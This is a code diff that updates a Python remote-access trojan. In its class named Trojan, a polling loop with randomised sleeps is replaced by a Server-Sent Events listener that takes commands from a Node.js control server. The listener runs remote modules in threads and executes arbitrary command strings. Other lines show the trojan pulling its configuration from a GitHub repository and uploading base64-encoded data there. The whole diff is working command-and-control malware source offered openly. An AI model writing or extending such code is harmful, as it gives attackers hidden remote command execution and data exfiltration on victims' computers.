@@ -8,6 +8,7 @@ import threading
 import time
 import subprocess
 import requests
+import sseclient  # Install this package via `pip install sseclient-py`
 from datetime import datetime
 
 def github_connect():
@@ -32,14 +33,6 @@ class Trojan:
     def get_github_config(self):
         config_json = get_file_contents('config', self.config_file, self.repo)
         return json.loads(base64.b64decode(config_json))
-
-    def get_nodejs_config(self):
-        try:
-            response = requests.get(f"{self.node_server_url}/config")
-            return response.json()
-        except requests.exceptions.RequestException as e:
-            print(f"[*] Failed to get config from Node.js server: {e}")
-            return None
 
     def send_command_result(self, command, result):
         try:
@@ -79,38 +72,34 @@ class Trojan:
         bindata = base64.b64encode(bytes('%r' % data, 'utf-8'))
         self.repo.create_file(remote_path, message, bindata)
 
+    def listen_for_commands(self):
+        # Establish SSE connection to Node.js server
+        response = requests.get(f"{self.node_server_url}/events", stream=True)
+        client = sseclient.SSEClient(response)
+        
+        for event in client.events():
+            command = json.loads(event.data)
+            if 'stop' in command:
+                print("[*] Stop signal received.")
+                self.running = False
+                self.update_status("Trojan stopped.")
+                break
+            elif command.get('action') == 'run_module':
+                module_name = command.get('module')
+                if module_name:
+                    print(f"[*] Running module: {module_name}")
+                    thread = threading.Thread(target=self.module_runner, args=(module_name,))
+                    thread.start()
+            elif 'command' in command:
+                command_str = command.get('command')
+                if command_str:
+                    print(f"[*] Executing command: {command_str}")
+                    self.execute_command(command_str)
+            else:
+                print(f"[*] Invalid command format: {command}")
+
     def run(self):
-        while self.running:
-            print("[*] Checking Node.js server for commands")
-
-            # Fetch real-time commands from Node.js server
-            nodejs_config = self.get_nodejs_config()
-
-            if nodejs_config:
-                if nodejs_config.get('stop'):
-                    print("[*] Stop signal received.")
-                    self.running = False
-                    self.update_status("Trojan stopped.")
-                    break
-
-                # Execute commands from Node.js server
-                for command in nodejs_config.get('commands', []):
-                    if isinstance(command, dict):
-                        if command.get("action") == "run_module":
-                            module_name = command.get("module")
-                            if module_name:
-                                print(f"[*] Running module: {module_name}")
-                                thread = threading.Thread(target=self.module_runner, args=(module_name,))
-                                thread.start()
-                        else:
-                            command_str = command.get("command")
-                            if command_str:
-                                print(f"[*] Executing command: {command_str}")
-                                self.execute_command(command_str)
-                    else:
-                        print(f"[*] Invalid command format: {command}")
-
-            time.sleep(random.randint(30*60, 3*60*60))  # Adjust for production
+        self.listen_for_commands()
 
 class GitImporter:
     def __init__(self):
